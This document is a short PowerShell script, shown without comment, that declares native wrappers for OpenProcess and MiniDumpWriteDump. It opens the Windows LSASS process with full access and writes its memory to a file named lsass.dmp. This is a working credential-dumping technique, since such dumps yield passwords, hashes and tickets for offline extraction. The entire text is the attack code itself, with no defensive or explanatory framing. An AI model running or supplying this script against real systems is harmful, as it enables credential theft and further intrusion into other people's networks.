Add-Type @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
}
public class Dbghelp {
    [DllImport("Dbghelp.dll")]
    public static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
}
"@;

$dumpFile = New-Object -Typename System.IO.FileStream -ArgumentList @("lsass.dmp", [System.IO.FileMode]::Create);
$lsassPID = (Get-Process -Name lsass).Id;
$hProcess = [Kernel32]::OpenProcess(0x001F0FFF, $false, $lsassPID);
$dumped = [Dbghelp]::MiniDumpWriteDump($hProcess, $lsassPID, $dumpFile.SafeFileHandle.DangerousGetHandle(), 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero);
Write-Host $(if($dumped) {"Success"} else{"Failed"});
$dumpFile.Close()

